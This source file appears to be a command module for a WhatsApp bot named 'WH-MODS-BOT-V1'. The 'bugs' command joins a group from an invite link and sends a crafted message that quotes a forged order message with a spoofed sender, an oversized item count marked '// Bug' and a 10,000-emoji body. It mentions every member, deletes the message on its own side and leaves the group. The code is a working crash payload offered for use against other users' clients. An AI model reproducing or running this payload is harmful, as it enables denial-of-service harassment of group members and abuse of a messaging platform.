let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i

let handler = async (m, { conn, text }) => {
    let [_, code] = text.match(linkRegex) || []
    if (!code) throw 'Link invalid'
    let { gid: target } = await conn.acceptInvite(code)
    let member = (await conn.groupMetadata(target)).participants.map(v => v.jid)
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0})
await conn.sendMessage(target, 'WH-MODS-BOT-V1', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999, // Bug
    status: 1,
    surface: 1,
    message: '🔥'.repeat(10000),
    orderTitle: 'WH-MODS-BOT-V1', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }, contextInfo: { mentionedJid: member }
}).then(v => conn.modifyChat(v.key.remoteJid, 'delete'))
await conn.groupLeave(target)
}

handler.command = /^bugs$/i

handler.owner = true

export default handler
